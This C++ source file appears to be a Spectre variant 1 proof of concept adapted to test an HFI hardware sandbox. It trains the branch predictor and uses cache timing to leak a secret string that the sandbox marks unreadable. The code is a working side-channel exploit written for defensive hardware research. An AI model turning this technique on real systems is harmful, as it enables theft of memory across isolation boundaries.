/*
 * Copyright 2019 Google LLC
 *
 * Licensed under both the 3-Clause BSD License and the GPLv2, found in the
 * LICENSE and LICENSE.GPL-2.0 files, respectively, in the root directory.
 *
 * SPDX-License-Identifier: BSD-3-Clause OR GPL-2.0
 */

// Causes misprediction of conditional branches that leads to a bounds check
// being bypassed during speculative execution. Leaks architecturally
// inaccessible data from the process's address space.
//
// PLATFORM NOTES:
// This program should leak data on pretty much any system where it compiles.
// We only require an out-of-order CPU that predicts conditional branches.

#include <array>
#include <cstring>
#include <iostream>
#include <memory>

#include "instr.h"
#include "timing_array.h"
#include "utils.h"

const char *public_data = "Hello, world!";
const char private_data[] __attribute__ ((aligned (128))) = "It's a s3kr3t!!!";

// Uncomment to enable hfi emulation
// #define HFI_EMULATION3

// outside the root folder of this repo
#include "../hw_isol_gem5/tests/test-progs/hfi/hfi.h"

// Leaks the byte that is physically located at &text[0] + offset, without ever
// loading it. In the abstract machine, and in the code executed by the CPU,
// this function does not load any memory except for what is in the bounds
// of `text`, and local auxiliary data.
//
// Instead, the leak is performed by accessing out-of-bounds during speculative
// execution, bypassing the bounds check by training the branch predictor to
// think that the value will be in-range.
static char LeakByte(const char *data, size_t offset) {
  TimingArray timing_array;
  // The size needs to be unloaded from cache to force speculative execution
  // to guess the result of comparison.
  //
  // TODO(asteinha): since size_in_heap is no longer the only heap-allocated
  // value, it should be allocated into its own unique page
  std::unique_ptr<size_t> size_in_heap = std::unique_ptr<size_t>(
      new size_t(strlen(data)));

  for (int run = 0;; ++run) {
    timing_array.FlushFromCache();
    // We pick a different offset every time so that it's guaranteed that the
    // value of the in-bounds access is usually different from the secret value
    // we want to leak via out-of-bounds speculative access.
    int safe_offset = run % strlen(data);

    // Loop length must be high enough to beat branch predictors.
    // The current length 2048 was established empirically. With significantly
    // shorter loop lengths some branch predictors are able to observe the
    // pattern and avoid branch mispredictions.
    for (size_t i = 0; i < 2048; ++i) {
      // Remove from cache so that we block on loading it from memory,
      // triggering speculative execution.
      FlushDataCacheLine(size_in_heap.get());

      // Train the branch predictor: perform in-bounds accesses 2047 times,
      // and then use the out-of-bounds offset we _actually_ care about on the
      // 2048th time.
      // The local_offset value computation is a branchless equivalent of:
      // size_t local_offset = ((i + 1) % 2048) ? safe_offset : offset;
      // We need to avoid branching even for unoptimized compilation (-O0).
      // Optimized compilations (-O1, concretely -fif-conversion) would remove
      // the branching automatically.
      size_t local_offset =
          offset + (safe_offset - offset) * static_cast<bool>((i + 1) % 2048);

      if (local_offset < *size_in_heap) {
        // This branch was trained to always be taken during speculative
        // execution, so it's taken even on the 2048th iteration, when the
        // condition is false!
        ForceRead(&timing_array[data[local_offset]]);
      }
    }

    int ret = timing_array.FindFirstCachedElementIndexAfter(data[safe_offset]);
    if (ret >= 0 && ret != data[safe_offset]) {
      return ret;
    }

    if (run > 100) {
      std::cerr << "Does not converge" << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

size_t round_to_next_pow2(size_t val) {
  size_t power = 1;
  while(power < val) {
    power *= 2;
  }
  return power;
}

int main() {
  hfi_sandbox sandbox;
  memset(&sandbox, 0, sizeof(hfi_sandbox));

  sandbox.is_trusted_sandbox = false;

  sandbox.code_ranges[0].base_mask = 0;
  sandbox.code_ranges[0].ignore_mask = 0;
  sandbox.code_ranges[0].executable = 1;

  // First region --- mark private_data as inaccessible
  const size_t private_data_len = strlen(private_data);
  const size_t private_data_len_pow2 = round_to_next_pow2(private_data_len);
  sandbox.data_ranges[0].base_mask = reinterpret_cast<uintptr_t>(private_data);
  sandbox.data_ranges[0].ignore_mask = ~reinterpret_cast<uint64_t>(private_data_len_pow2 - 1);
  sandbox.data_ranges[0].readable = 0;
  sandbox.data_ranges[0].writeable = 0;

  // Second region --- mark all (remaining) addresses as accessible
  sandbox.data_ranges[1].base_mask = 0;
  sandbox.data_ranges[1].ignore_mask = 0;
  sandbox.data_ranges[1].readable = 1;
  sandbox.data_ranges[1].writeable = 1;

  hfi_set_sandbox_metadata(&sandbox);
  hfi_enter_sandbox();

  puts("Running poc after hfi protections");

  std::cout << "Leaking the string: ";
  std::cout.flush();
  const size_t private_offset = private_data - public_data;
  for (size_t i = 0; i < private_data_len; ++i) {
    // On at least some machines, this will print the i'th byte from
    // private_data, despite the only actually-executed memory accesses being
    // to valid bytes in public_data.
    std::cout << LeakByte(public_data, private_offset + i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";

  hfi_exit_sandbox();
}
